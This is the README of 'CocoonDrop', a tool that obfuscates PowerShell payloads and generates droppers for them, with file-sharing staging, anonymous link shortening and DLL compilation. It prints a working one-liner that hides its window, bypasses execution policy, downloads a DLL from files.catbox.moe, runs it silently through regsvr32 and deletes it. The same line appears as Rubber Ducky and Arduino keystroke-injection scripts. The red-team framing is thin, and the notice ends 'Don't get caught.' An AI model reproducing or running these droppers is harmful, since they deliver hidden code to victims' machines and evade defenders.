# 🐛 CocoonDrop

> _Wrap your payload in a shell of silence._

**CocoonDrop** is a multi-stage payload obfuscator and dropper generator tailored for CTF creators, red teamers, and anyone needing to make payload delivery **silent**, **modular**, and **weirdly beautiful**.

It encrypts PowerShell payloads using XOR + Base64, stages them via Catbox, optionally shortens URLs using **goolnk over RapidAPI (no key needed)**, wraps them in a one-liner, compiles that into a DLL, and delivers the whole thing through your choice of:
- a raw PowerShell command,
- a Rubber Ducky script,
- or a Beetle USB injection sketch.

---

## ⚙️ Features

- ✅ XOR + Base64 obfuscation with custom key or auto-generation
- ✅ Catbox upload of encrypted payload and staging script
- ✅ **Anonymous URL shortening** using RapidAPI + goolnk (no key required)
- ✅ One-liner PowerShell wrapper that pulls & decrypts live
- ✅ Auto-compiled GCC DLL embedding the obfuscated payload
- ✅ Final delivery via:
  - 🖥️ PowerShell execution
  - 🐥 Rubber Ducky HID script
  - 🪲 Beetle USB Arduino HID script
- ✅ Full PyQt5 GUI with dark mode
- ✅ Transparent logging for each phase

---

## 📦 Installation

### 🔧 Requirements

- Python 3.7+
- GCC (`gcc`, `mingw-w64`, or `x86_64-w64-mingw32-gcc`)
- Internet connection (for Catbox & goolnk)

### 🐍 Python Dependencies

```bash
pip install pyqt5 catbox-uploader requests
```

---

## 🧪 Use Cases

| Use Case          | Description                                       |
|-------------------|---------------------------------------------------|
| 🔐 Red Team       | Payload dropper for low-visibility delivery       |
| 🧠 CTF Creation    | Make challenge stages that feel real              |
| 🔌 HID Injection   | Combine with Ducky or Beetle USB for physical access |
| 🔍 Adversarial Sim| Simulate malware delivery without the malware     |
| 🛡️ EDR Testing     | Safe, weird payload behaviors for defense teams   |

---

## 🧰 Workflow Overview

```
[PowerShell Script]
        ↓
[XOR + Base64 Encode]
        ↓
[Upload to Catbox]
        ↓
[Generate Stager → Upload to Catbox]
        ↓
[Shorten Link via goolnk (no key)]
        ↓
[Insert into PowerShell One-Liner]
        ↓
[Encode to UTF-16LE + Base64]
        ↓
[Insert into DLL C Code Template]
        ↓
[Compile DLL → Upload to Catbox]
        ↓
[Final PS Dropper + Ducky/Beetle Scripts (optional)]
```

---

## 🚀 Usage

```bash
git clone https://github.com/YOUR-USERNAME/cocoondrop.git
cd cocoondrop
python cocoondrop.py
```

---

## 🖥️ Output Examples

### 🪄 Final PowerShell One-Liner

```powershell
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://files.catbox.moe/abc123.dll' -OutFile '$env:TEMP\dropper.dll'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\dropper.dll'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\dropper.dll'"
```

### 🐥 Rubber Ducky Script

```ducky
DELAY 1000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 700
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://...dll' ..."
ENTER
```

### 🪲 Beetle USB Sketch (Arduino)

```cpp
typeString("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ");
typeString(""(Invoke-WebRequest -Uri 'https://files.catbox.moe/abc123.dll' -OutFile '$env:TEMP\dropper.dll'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\dropper.dll'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\dropper.dll'"");
```

---

## ✍️ GUI Walkthrough

1. 💬 Paste your PowerShell payload  
2. 🔑 Choose or generate a key  
3. 🧪 Encrypt & upload payload  
4. 📤 Auto-generate and upload staging script  
5. 🔗 CocoonDrop silently shortens it via goolnk RapidAPI  
6. 🧙 Generate DLL from the embedded payload  
7. 📎 Get the final execution script  
8. 🎯 Choose HID output (Ducky / Beetle) — optional  

---

## 🔐 Legal & Ethics Notice

CocoonDrop is strictly for:

- 🔐 Ethical red teaming  
- 🧠 CTF creation  
- 🧪 Adversarial simulations  
- 🛡️ Blue team EDR testing  

**You are responsible for your actions.**  
Don't be evil. Don't be stupid. Don’t get caught.

---

## 🧬 Why "CocoonDrop"?

Like a cocoon, the payload is hidden, dormant, ready to execute only when triggered.  
It doesn’t crawl. It waits.  
It doesn’t fight. It deploys.

---

## 👨‍🔧 Credits

- **beigeworm** for the inspo  
- **me** for reverse engineering his brilliance and turning it into an obfuscator  

---

## 🛠️ TODO

- Use more encryption than XOR  
- Add polymorphic encryption with variable layers  

---

## 🪓 License

MIT. Just don’t use it for malware and don’t sue me.
